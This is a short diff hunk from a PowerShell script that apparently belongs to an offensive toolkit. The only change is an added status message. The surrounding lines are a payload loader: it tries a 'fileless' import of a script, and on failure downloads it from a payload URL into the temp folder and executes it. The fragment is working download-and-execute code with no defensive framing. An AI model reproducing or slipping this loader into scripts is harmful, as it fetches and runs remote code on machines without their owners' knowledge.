@@ -1073,6 +1073,7 @@ If($PayloadURL -ne "false")
       Import-Module -Name .\$RawName.ps1 -Force;&"$RawName" #<INPUT_CMDLET_ARGUMENT_LIST>
    }catch{
       iwr -Uri "$PayloadURL" -OutFile "$Env:TMP\$RawName.ps1"
+      Write-Host "* fail to import $RawName (fileless), defaulting to IWR (local download)`n" -ForegroundColor Red -BackgroundColor Black
       Start-Sleep -Seconds 3;&"$Env:TMP\$RawName.ps1" #<INPUT_CMDLET_ARGUMENT_LIST>   
    }
 
